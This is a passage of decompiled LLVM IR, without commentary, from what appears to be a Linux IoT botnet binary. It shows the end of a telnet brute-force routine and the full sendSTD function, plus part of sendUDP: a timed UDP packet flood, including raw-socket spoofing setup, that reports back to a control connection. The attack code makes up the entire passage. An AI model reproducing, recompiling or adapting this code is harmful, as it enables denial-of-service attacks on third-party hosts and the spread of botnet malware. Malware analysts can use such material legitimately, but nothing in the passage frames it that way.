  store i32 %v1_804c740, i32* @ebx, align 4
  %v2_804c746 = inttoptr i32 %v0_804c6f5 to i32*
  store i32 0, i32* %v2_804c746, align 4
  %tmp39 = inttoptr i32 %v0_804c6a7 to i32*
  %v3_804c748 = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_804c748, i32* %eax.global-to-local, align 4
  %v0_804c750 = load i32, i32* @ebx, align 4
  %v7_804c750 = icmp ult i32 %v0_804c750, %v3_804c748
  %v1_804c752 = icmp eq i1 %v7_804c750, false
  br i1 %v1_804c752, label %dec_label_pc_804c779, label %dec_label_pc_804c754

dec_label_pc_804c754:                             ; preds = %dec_label_pc_804c723
  %v0_804c74d = load i32, i32* @esp, align 4
  store i32 %v1_804b83c, i32* @edx, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  %v3_804c770 = inttoptr i32 %v0_804c74d to i32*
  store i32 %v2_804b84c, i32* %v3_804c770, align 4
  %v2_804c771 = call i32 @reset_telstate(i32 %v0_804c6a7)
  store i32 %v2_804c771, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c779

dec_label_pc_804c779:                             ; preds = %dec_label_pc_804b885, %dec_label_pc_804c723, %dec_label_pc_804c5be, %dec_label_pc_804c1dc, %dec_label_pc_804bf58, %dec_label_pc_804be1c, %dec_label_pc_804baa5, %dec_label_pc_804c6fc, %dec_label_pc_804c5f3, %dec_label_pc_804c594, %dec_label_pc_804c4dd, %dec_label_pc_804c4b1, %dec_label_pc_804c436, %dec_label_pc_804c357, %dec_label_pc_804c32d, %dec_label_pc_804c2d1, %dec_label_pc_804c211, %dec_label_pc_804c1b0, %dec_label_pc_804c184, %dec_label_pc_804c0d3, %dec_label_pc_804c0a9, %dec_label_pc_804c04d, %dec_label_pc_804bf8d, %dec_label_pc_804bf2c, %dec_label_pc_804bf00, %dec_label_pc_804be51, %dec_label_pc_804bdf2, %dec_label_pc_804bd6a, %dec_label_pc_804bd40, %dec_label_pc_804bc0a, %dec_label_pc_804bbe0, %dec_label_pc_804ba85, %dec_label_pc_804ba47, %dec_label_pc_804c754
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.243, %dec_label_pc_804b885 ], [ %stack_var_-624.243, %dec_label_pc_804c723 ], [ %stack_var_-624.243, %dec_label_pc_804c754 ], [ %stack_var_-624.243, %dec_label_pc_804c6fc ], [ %stack_var_-624.243, %dec_label_pc_804c5be ], [ %stack_var_-624.243, %dec_label_pc_804c5f3 ], [ %stack_var_-624.243, %dec_label_pc_804c594 ], [ %stack_var_-624.243, %dec_label_pc_804c4dd ], [ %stack_var_-624.243, %dec_label_pc_804c4b1 ], [ %stack_var_-624.243, %dec_label_pc_804c436 ], [ %v4_804c25a, %dec_label_pc_804c357 ], [ %v4_804c25a, %dec_label_pc_804c32d ], [ %v4_804c25a, %dec_label_pc_804c2d1 ], [ %stack_var_-624.243, %dec_label_pc_804c1dc ], [ %stack_var_-624.243, %dec_label_pc_804c211 ], [ %stack_var_-624.243, %dec_label_pc_804c1b0 ], [ %stack_var_-624.243, %dec_label_pc_804c184 ], [ %stack_var_-624.243, %dec_label_pc_804c0d3 ], [ %stack_var_-624.243, %dec_label_pc_804c0a9 ], [ %stack_var_-624.243, %dec_label_pc_804c04d ], [ %stack_var_-624.243, %dec_label_pc_804bf58 ], [ %stack_var_-624.243, %dec_label_pc_804bf8d ], [ %stack_var_-624.243, %dec_label_pc_804bf2c ], [ %stack_var_-624.243, %dec_label_pc_804bf00 ], [ %stack_var_-624.243, %dec_label_pc_804be1c ], [ %stack_var_-624.243, %dec_label_pc_804be51 ], [ %stack_var_-624.243, %dec_label_pc_804bdf2 ], [ %stack_var_-624.243, %dec_label_pc_804bd6a ], [ %stack_var_-624.243, %dec_label_pc_804bd40 ], [ %stack_var_-624.243, %dec_label_pc_804baa5 ], [ %stack_var_-624.243, %dec_label_pc_804bc0a ], [ %stack_var_-624.243, %dec_label_pc_804bbe0 ], [ %stack_var_-624.243, %dec_label_pc_804ba85 ], [ %stack_var_-624.243, %dec_label_pc_804ba47 ]
  %stack_var_-620.1 = phi i32 [ %stack_var_-620.244, %dec_label_pc_804b885 ], [ %stack_var_-620.244, %dec_label_pc_804c723 ], [ %stack_var_-620.244, %dec_label_pc_804c754 ], [ %stack_var_-620.244, %dec_label_pc_804c6fc ], [ %stack_var_-620.244, %dec_label_pc_804c5be ], [ %stack_var_-620.244, %dec_label_pc_804c5f3 ], [ %stack_var_-620.244, %dec_label_pc_804c594 ], [ %stack_var_-620.244, %dec_label_pc_804c4dd ], [ %stack_var_-620.244, %dec_label_pc_804c4b1 ], [ %stack_var_-620.244, %dec_label_pc_804c436 ], [ %stack_var_-620.244, %dec_label_pc_804c357 ], [ %stack_var_-620.244, %dec_label_pc_804c32d ], [ %stack_var_-620.244, %dec_label_pc_804c2d1 ], [ %stack_var_-620.244, %dec_label_pc_804c1dc ], [ %stack_var_-620.244, %dec_label_pc_804c211 ], [ %stack_var_-620.244, %dec_label_pc_804c1b0 ], [ %stack_var_-620.244, %dec_label_pc_804c184 ], [ %v4_804bfd6, %dec_label_pc_804c0d3 ], [ %v4_804bfd6, %dec_label_pc_804c0a9 ], [ %v4_804bfd6, %dec_label_pc_804c04d ], [ %stack_var_-620.244, %dec_label_pc_804bf58 ], [ %stack_var_-620.244, %dec_label_pc_804bf8d ], [ %stack_var_-620.244, %dec_label_pc_804bf2c ], [ %stack_var_-620.244, %dec_label_pc_804bf00 ], [ %stack_var_-620.244, %dec_label_pc_804be1c ], [ %stack_var_-620.244, %dec_label_pc_804be51 ], [ %stack_var_-620.244, %dec_label_pc_804bdf2 ], [ %stack_var_-620.244, %dec_label_pc_804bd6a ], [ %stack_var_-620.244, %dec_label_pc_804bd40 ], [ %stack_var_-620.244, %dec_label_pc_804baa5 ], [ %stack_var_-620.244, %dec_label_pc_804bc0a ], [ %stack_var_-620.244, %dec_label_pc_804bbe0 ], [ %stack_var_-620.244, %dec_label_pc_804ba85 ], [ %stack_var_-620.244, %dec_label_pc_804ba47 ]
  %v4_804c779 = add nuw nsw i32 %storemerge45, 1
  store i32 %v4_804c779, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804c779, %arg2
  br i1 %exitcond, label %dec_label_pc_804b82a, label %dec_label_pc_804b836

; uselistorder directives
  uselistorder i32 %v4_804c779, { 1, 2, 0 }
  uselistorder i32 %stack_var_-620.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32 %v0_804c676, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804c488, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804c42f, { 1, 2, 0 }
  uselistorder i32* %v1_804c3e3, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804c326, { 1, 0, 2 }
  uselistorder i32 %v0_804c2ca, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804c25a, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804c1cc, { 1, 0 }
  uselistorder i32 %v0_804c17d, { 1, 2, 0 }
  uselistorder i32 %v0_804c0a2, { 1, 0, 2 }
  uselistorder i32 %v0_804c046, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804bfd6, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804bf48, { 1, 0 }
  uselistorder i32 %v0_804bef9, { 1, 2, 0 }
  uselistorder i32 %v0_804bdbd, { 1, 0 }
  uselistorder i32 %v13_804bd95, { 1, 0 }
  uselistorder i32 %v0_804bd90, { 2, 0, 1 }
  uselistorder i32 %v0_804bcdb, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v5_804bcd6, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804bc86, { 1, 0 }
  uselistorder i32 %v2_804bc6a, { 1, 0 }
  uselistorder i32 %v0_804bc23, { 1, 0 }
  uselistorder i32 %v0_804bb9e, { 2, 0, 1 }
  uselistorder i32 %v12_804bb76, { 1, 0 }
  uselistorder i32 %v0_804bb71, { 2, 0, 1 }
  uselistorder i32 %v2_804baf3, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v0_804bab8, { 2, 0, 1 }
  uselistorder i32 %v2_804b905, { 1, 0 }
  uselistorder i32 %v6_804b89b, { 9, 10, 11, 8, 6, 7, 5, 3, 4, 2, 1, 13, 12, 14, 0 }
  uselistorder i32* %v1_804b851, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804b84e, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804b84c, { 49, 50, 51, 52, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 33, 34, 35, 36, 37, 27, 28, 29, 30, 31, 32, 22, 23, 24, 25, 26, 16, 17, 18, 19, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804b84a, { 10, 11, 12, 1, 13, 0, 14, 2, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 5, 41, 42, 7, 43, 45, 8, 44, 9 }
  uselistorder i32 %v1_804b83c, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 %stack_var_-624.243, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %stack_var_-620.244, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %storemerge45, { 0, 3, 4, 5, 6, 8, 7, 1, 2 }
  uselistorder i32 %v4_804b819, { 1, 2, 0 }
  uselistorder i32 %storemerge251, { 1, 0 }
  uselistorder i32 %v2_804b772, { 1, 0 }
  uselistorder i32 %v2_804b755, { 14, 13, 12, 16, 15, 17, 18, 21, 20, 19, 5, 6, 7, 8, 22, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32 %v1_804b701, { 1, 0, 2 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 2, 4, 1, 0, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 3, 4, 2, 1, 0, 5, 6, 7 }
  uselistorder i32* %stack_var_-332, { 6, 0, 8, 9, 3, 4, 7, 2, 1, 5, 11, 10, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 39, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32* %eax.global-to-local, { 201, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 81, 79, 80, 82, 83, 76, 84, 85, 86, 87, 88, 89, 91, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 113, 116, 114, 115, 117, 118, 111, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 179, 194, 195, 196, 197, 198, 199, 200, 223, 202, 203, 216, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 224, 217, 218, 219, 220, 221, 222 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804c779, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804b885, { 1, 0 }
  uselistorder label %dec_label_pc_804b836, { 1, 0 }
  uselistorder label %dec_label_pc_804b82a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b819, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_804c7a0 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804c7b0 = call i32 @__GI_time(i32* null)
  %v1_804c7c2 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804c7cd = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_804c7ee = add i32 %v1_804c7c2, 12
  %v2_804c7ee = inttoptr i32 %v1_804c7ee to i32*
  %v3_804c7ee = load i32, i32* %v2_804c7ee, align 4
  %v2_804c7f6 = ptrtoint i32* %stack_var_-40 to i32
  %v1_804c7fc = add i32 %v1_804c7c2, 16
  %v2_804c7fc = inttoptr i32 %v1_804c7fc to i32*
  %v3_804c7fc = load i32, i32* %v2_804c7fc, align 4
  %v1_804c7ff = inttoptr i32 %v3_804c7fc to i32*
  %v2_804c7ff = load i32, i32* %v1_804c7ff, align 4
  %v4_804c807 = call i32 @bcopy(i32 %v2_804c7ff, i32 %v2_804c7f6, i32 %v3_804c7ee)
  %v1_804c812 = add i32 %v1_804c7c2, 8
  %v2_804c812 = inttoptr i32 %v1_804c812 to i32*
  %v3_804c812 = load i32, i32* %v2_804c812, align 4
  store i32 %v3_804c812, i32* %stack_var_-44, align 4
  %v4_804c83d = bitcast i32* %stack_var_-188 to i16*
  %v5_804c8c8 = add i32 %v2_804c7b0, %arg3
  br label %dec_label_pc_804c827

dec_label_pc_804c827:                             ; preds = %dec_label_pc_804c8ee, %entry
  %storemerge = phi i32 [ %v4_804c8ee, %dec_label_pc_804c8ee ], [ 0, %entry ]
  %v5_804c83d = call i32 @memcpy(i16* %v4_804c83d, i32 ptrtoint ([36 x i8*]* @global_var_80578e0.219 to i32), i32 144)
  store i32 %v5_804c83d, i32* @eax, align 4
  %v0_804c845 = call i32 @random()
  %v2_804c855 = udiv i32 %v0_804c845, 36
  %tmp = mul nsw i32 %v2_804c855, -4
  %v2_804c872 = add i32 %v0_804c845, %tmp
  store i32 %v2_804c872, i32* @ebx, align 4
  %tmp31 = icmp ult i32 %storemerge, 50
  br i1 %tmp31, label %dec_label_pc_804c827.dec_label_pc_804c8ee_crit_edge, label %dec_label_pc_804c890

dec_label_pc_804c827.dec_label_pc_804c8ee_crit_edge: ; preds = %dec_label_pc_804c827
  br label %dec_label_pc_804c8ee

dec_label_pc_804c890:                             ; preds = %dec_label_pc_804c827
  %v0_804c880 = load i32, i32* @ebp, align 4
  %v3_804c880 = add i32 %v0_804c880, -184
  %v2_804c880 = mul i32 %v2_804c872, 4
  %v4_804c880 = add i32 %v3_804c880, %v2_804c880
  %v5_804c880 = inttoptr i32 %v4_804c880 to i32*
  %v6_804c880 = load i32, i32* %v5_804c880, align 4
  %v5_804c89a = call i32 @__libc_send(i32 %v4_804c7a0, i32 %v6_804c880, i32 65, i32 0)
  %v4_804c8ae = call i32 @__libc_connect(i32 %v4_804c7a0, i32 %v2_804c7cd, i32 16)
  %v2_804c8bb = call i32 @__GI_time(i32* null)
  %v5_804c8cd = icmp slt i32 %v2_804c8bb, %v5_804c8c8
  br i1 %v5_804c8cd, label %dec_label_pc_804c8ee, label %dec_label_pc_804c8cf

dec_label_pc_804c8cf:                             ; preds = %dec_label_pc_804c890
  %v1_804c8d5 = call i32 @__libc_close(i32 %v4_804c7a0)
  %v1_804c8e2 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c8ee:                             ; preds = %dec_label_pc_804c827.dec_label_pc_804c8ee_crit_edge, %dec_label_pc_804c890
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_804c827.dec_label_pc_804c8ee_crit_edge ], [ 0, %dec_label_pc_804c890 ]
  %v4_804c8ee = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804c827

; uselistorder directives
  uselistorder i32 %v2_804c872, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804c7c2, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_804c8ee, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp41 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_804c8fa = load i32, i32* @ebx, align 4
  %v12_804c8fb = ptrtoint i32* %stack_var_-124 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804c904 = icmp eq i32 %arg2, 0
  %v1_804c908 = icmp eq i1 %v4_804c904, false
  br i1 %v1_804c908, label %dec_label_pc_804c915, label %dec_label_pc_804c90a

dec_label_pc_804c90a:                             ; preds = %entry
  %v1_804c90a = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804c92d

dec_label_pc_804c915:                             ; preds = %entry
  %v1_804c918 = urem i32 %arg2, 65536
  store i32 %v1_804c918, i32* %eax.global-to-local, align 4
  %v1_804c921 = call i32 @htons(i32 %v1_804c918)
  br label %dec_label_pc_804c92d

dec_label_pc_804c92d:                             ; preds = %dec_label_pc_804c90a, %dec_label_pc_804c915
  %v2_804c930 = ptrtoint i32* %stack_var_-68 to i32
  %v15_804c933 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804c933, i32* %eax.global-to-local, align 4
  %v4_804c93a = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804c93a, i32* %eax.global-to-local, align 4
  %v1_804c942 = icmp eq i32 %v4_804c93a, 0
  %v1_804c944 = icmp eq i1 %v1_804c942, false
  br i1 %v1_804c944, label %dec_label_pc_804cde0, label %dec_label_pc_804c94a

dec_label_pc_804c94a:                             ; preds = %dec_label_pc_804c92d
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804c963 = icmp eq i32 %arg4, 32
  %v1_804c967 = icmp eq i1 %v9_804c963, false
  br i1 %v1_804c967, label %dec_label_pc_804ca9f, label %dec_label_pc_804c96d

dec_label_pc_804c96d:                             ; preds = %dec_label_pc_804c94a
  %v4_804c976 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804c976, i32* %eax.global-to-local, align 4
  %v4_804c981 = icmp eq i32 %v4_804c976, 0
  %v1_804c985 = icmp eq i1 %v4_804c981, false
  br i1 %v1_804c985, label %dec_label_pc_804c9a2, label %dec_label_pc_804c987

dec_label_pc_804c987:                             ; preds = %dec_label_pc_804c96d
  %v0_804c987 = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804c987, i32* %eax.global-to-local, align 4
  %v3_804c995 = call i32 @sockprintf(i32 %v0_804c987, i32 ptrtoint ([27 x i8]* @global_var_8057970.220 to i32))
  store i32 %v3_804c995, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cde0

dec_label_pc_804c9a2:                             ; preds = %dec_label_pc_804c96d
  %v1_804c9a5 = add i32 %arg5, 1
  store i32 %v1_804c9a5, i32* %eax.global-to-local, align 4
  %v1_804c9aa = call i32 @malloc(i32 %v1_804c9a5)
  store i32 %v1_804c9aa, i32* %eax.global-to-local, align 4
  %v4_804c9b5 = icmp eq i32 %v1_804c9aa, 0
  br i1 %v4_804c9b5, label %dec_label_pc_804cde0, label %dec_label_pc_804c9bf

dec_label_pc_804c9bf:                             ; preds = %dec_label_pc_804c9a2
  store i32 %v1_804c9a5, i32* %edx.global-to-local, align 4
  %v1_804c9c8 = inttoptr i32 %v1_804c9aa to i8*
  store i32 %v1_804c9aa, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804c9cd = and i32 %v1_804c9aa, -256
  store i32 %v1_804c9cd, i32* %eax.global-to-local, align 4
  %v5_804c9cf = call i8* @_memset(i8* %v1_804c9c8, i32 %v1_804c9cd, i32 %v1_804c9a5)
  %v3_804c9d7 = call i32 @makeRandomStr(i8* %v1_804c9c8, i32 %arg5)
  store i32 %v3_804c9d7, i32* %eax.global-to-local, align 4
  %v2_804c9e4 = call i32 @__GI_time(i32* null)
  %v5_804c9ec = add i32 %v2_804c9e4, %arg3
  store i32 %v5_804c9ec, i32* %eax.global-to-local, align 4
  %v1_804ca73 = mul i32 %arg8, 100
  %v2_804ca7c = mul i32 %arg8, 1000
  %v1_804ca83 = sext i32 %v2_804ca7c to i64
  br label %dec_label_pc_804ca02.outer

dec_label_pc_804ca02.outer:                       ; preds = %dec_label_pc_804ca60, %dec_label_pc_804ca97, %dec_label_pc_804c9bf
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804c9bf ], [ 0, %dec_label_pc_804ca60 ], [ %v4_804ca97, %dec_label_pc_804ca97 ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804c9bf ], [ %v4_804ca55, %dec_label_pc_804ca60 ], [ %v4_804ca55, %dec_label_pc_804ca97 ]
  br label %dec_label_pc_804ca02

dec_label_pc_804ca02:                             ; preds = %dec_label_pc_804ca02.outer, %dec_label_pc_804ca36
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804ca36 ], [ %stack_var_-92.0.ph, %dec_label_pc_804ca02.outer ]
  store i32 %v2_804c930, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804c976, i32* %stack_var_-156, align 4
  %v7_804ca17 = call i32 @__libc_sendto(i32 %v4_804c976, i32 %v1_804c9aa, i32 %arg5, i32 0, i32 %v2_804c930, i32 16)
  store i32 %v7_804ca17, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804ca22 = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804ca25 = icmp eq i1 %v15_804ca22, false
  br i1 %v1_804ca25, label %dec_label_pc_804ca55, label %dec_label_pc_804ca27

dec_label_pc_804ca27:                             ; preds = %dec_label_pc_804ca02
  br i1 %v1_804c908, label %dec_label_pc_804ca36, label %dec_label_pc_804ca2d

dec_label_pc_804ca2d:                             ; preds = %dec_label_pc_804ca27
  %v0_804ca2d = load i32, i32* %stack_var_-156, align 4
  %v1_804ca2d = call i32 @rand_cmwc(i32 %v0_804ca2d)
  store i32 %v1_804ca2d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca36

dec_label_pc_804ca36:                             ; preds = %dec_label_pc_804ca27, %dec_label_pc_804ca2d
  %v2_804ca3b = call i32 @__GI_time(i32* null)
  store i32 %v2_804ca3b, i32* %eax.global-to-local, align 4
  %v8_804ca46 = icmp sgt i32 %v2_804ca3b, %v5_804c9ec
  br i1 %v8_804ca46, label %dec_label_pc_804cde0, label %dec_label_pc_804ca02

dec_label_pc_804ca55:                             ; preds = %dec_label_pc_804ca02
  %v4_804ca55 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804ca5b = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804ca5e = icmp eq i1 %v15_804ca5b, false
  br i1 %v1_804ca5e, label %dec_label_pc_804ca97, label %dec_label_pc_804ca60

dec_label_pc_804ca60:                             ; preds = %dec_label_pc_804ca55
  store i32 %v1_804ca73, i32* %edx.global-to-local, align 4
  store i32 %v2_804ca7c, i32* %eax.global-to-local, align 4
  %v2_804ca83 = call i32 @usleep(i64 %v1_804ca83)
  store i32 %v2_804ca83, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca02.outer

dec_label_pc_804ca97:                             ; preds = %dec_label_pc_804ca55
  %v4_804ca97 = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804ca02.outer

dec_label_pc_804ca9f:                             ; preds = %dec_label_pc_804c94a
  store i32 %v12_804c8fb, i32* %eax.global-to-local, align 4
  %v4_804caad = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804caad, i32* %eax.global-to-local, align 4
  %v4_804cab8 = icmp eq i32 %v4_804caad, 0
  %v1_804cabc = icmp eq i1 %v4_804cab8, false
  br i1 %v1_804cabc, label %dec_label_pc_804cad9, label %dec_label_pc_804cabe

dec_label_pc_804cabe:                             ; preds = %dec_label_pc_804ca9f
  %v0_804cabe = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804cabe, i32* %eax.global-to-local, align 4
  %v3_804cacc = call i32 @sockprintf(i32 %v0_804cabe, i32 ptrtoint ([27 x i8]* @global_var_8057970.220 to i32))
  store i32 %v3_804cacc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cddd

dec_label_pc_804cad9:                             ; preds = %dec_label_pc_804ca9f
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804cae5 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804cae5, i32* %eax.global-to-local, align 4
  store i32 %v4_804caad, i32* %stack_var_-156, align 4
  %v5_804caf0 = call i32 @__GI_setsockopt(i32 %v4_804caad, i32 0, i32 3, i32 %v2_804cae5, i32 4)
  store i32 %v5_804caf0, i32* %eax.global-to-local, align 4
  %v2_804caf8 = icmp slt i32 %v5_804caf0, 0
  %v1_804cafa = icmp eq i1 %v2_804caf8, false
  br i1 %v1_804cafa, label %dec_label_pc_804cb50.preheader, label %dec_label_pc_804cafc

dec_label_pc_804cb50.preheader:                   ; preds = %dec_label_pc_804cad9
  br label %dec_label_pc_804cb20

dec_label_pc_804cafc:                             ; preds = %dec_label_pc_804cad9
  %v0_804cafc = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804cafc, i32* %eax.global-to-local, align 4
  %v3_804cb0a = call i32 @sockprintf(i32 %v0_804cafc, i32 ptrtoint ([33 x i8]* @global_var_805798c.221 to i32))
  store i32 %v3_804cb0a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cddd

dec_label_pc_804cb20:                             ; preds = %dec_label_pc_804cb50.preheader, %dec_label_pc_804cb20
  %stack_var_-32.088 = phi i32 [ 50, %dec_label_pc_804cb50.preheader ], [ %v4_804cb50, %dec_label_pc_804cb20 ]
  %v4_804cb50 = add nsw i32 %stack_var_-32.088, -1
  %v2_804cb25 = call i32 @__GI_time(i32* null)
  store i32 %v2_804cb25, i32* %eax.global-to-local, align 4
  store i32 %v2_804cb25, i32* @ebx, align 4
  %v1_804cb2f = call i32 @rand_cmwc(i32 0)
  %v1_804cb34 = load i32, i32* @ebx, align 4
  %v2_804cb34 = xor i32 %v1_804cb34, %v1_804cb2f
  store i32 %v2_804cb34, i32* @eax, align 4
  %v1_804cb3a = call i32 @srand(i32 %v2_804cb34)
  store i32 %v1_804cb3a, i32* @eax, align 4
  %v0_804cb42 = call i32 @random()
  store i32 %v0_804cb42, i32* %eax.global-to-local, align 4
  %v1_804cb48 = call i32 @init_rand(i32 %v0_804cb42)
  store i32 %v1_804cb48, i32* %eax.global-to-local, align 4
  %v13_804cb53 = icmp eq i32 %v4_804cb50, 0
